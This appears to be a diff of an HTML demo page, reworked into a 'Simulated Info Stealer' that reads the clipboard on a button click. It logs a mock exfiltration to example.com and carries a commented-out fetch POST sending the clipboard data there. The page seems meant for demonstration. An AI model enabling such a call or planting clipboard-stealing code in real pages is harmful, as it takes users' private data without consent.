@@ -1,61 +1,67 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Browser Fingerprinting & Clipboard Demo</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            padding: 40px;
-            text-align: center;
-        }
-        button {
-            padding: 10px 20px;
-            margin: 10px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        pre {
-            margin-top: 20px;
-            background: #eee;
-            padding: 15px;
-            display: inline-block;
-            text-align: left;
-            max-width: 90%;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Simulated Info Stealer</title>
+  <style>
+    body {
+      background-color: #1a1a2e;
+      color: #ffffff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 50px;
+    }
+    h1 {
+      color: #FF4C4C;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      margin-top: 20px;
+      background-color: #cc0000;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      cursor: pointer;
+      transition: 0.2s ease;
+    }
+    button:hover {
+      background-color: #ff4c4c;
+      color: #000;
+    }
+    #output {
+      margin-top: 30px;
+      font-size: 18px;
+    }
+  </style>
 </head>
 <body>
-    <h1>Browser Fingerprinting & Clipboard Demo</h1>
-    <button onclick="readClipboard()">Simple Clipboard Read</button>
-    <button onclick="stealClipboard()">Simulated Info Stealer</button>
-    <pre id="output">Clipboard content will appear here...</pre>
+  <h1>Simulated Info Stealer</h1>
+  <button onclick="stealClipboard()">🚨 Steal Clipboard</button>
+  <div id="output"></div>
 
-    <script>
-    async function readClipboard() {
-        try {
-            const data = await navigator.clipboard.readText();
-            document.getElementById("output").innerText = "Clipboard: " + data;
-        } catch (err) {
-            document.getElementById("output").innerText = "Clipboard read blocked or denied.";
-        }
-    }
-
+  <script>
     async function stealClipboard() {
-        try {
-            const data = await navigator.clipboard.readText();
-            document.getElementById("output").innerText = "Clipboard: " + data;
+      try {
+        const data = await navigator.clipboard.readText();
+        document.getElementById("output").innerText = "Clipboard: " + data;
 
-            // Simulated exfiltration
-console.log("⚠️ Simulated exfiltration to https://example.com/steal");
-console.log("Payload:", JSON.stringify({ stolenData: data }));
+        // Simulated exfiltration log (not actually sending)
+        console.log("⚠️ Simulated exfiltration to https://example.com/steal");
+        console.log("Payload:", JSON.stringify({ stolenData: data }));
 
-        } catch (err) {
-            document.getElementById("output").innerText = "Clipboard read blocked or denied.";
-        }
+        // Optional: Fake POST (commented out)
+        // fetch("https://example.com/steal", {
+        //   method: "POST",
+        //   headers: { "Content-Type": "application/json" },
+        //   body: JSON.stringify({ stolenData: data }),
+        // });
+
+      } catch (err) {
+        document.getElementById("output").innerText = "❌ Failed to read clipboard: " + err;
+      }
     }
-    </script>
+  </script>
 </body>
 </html>
-
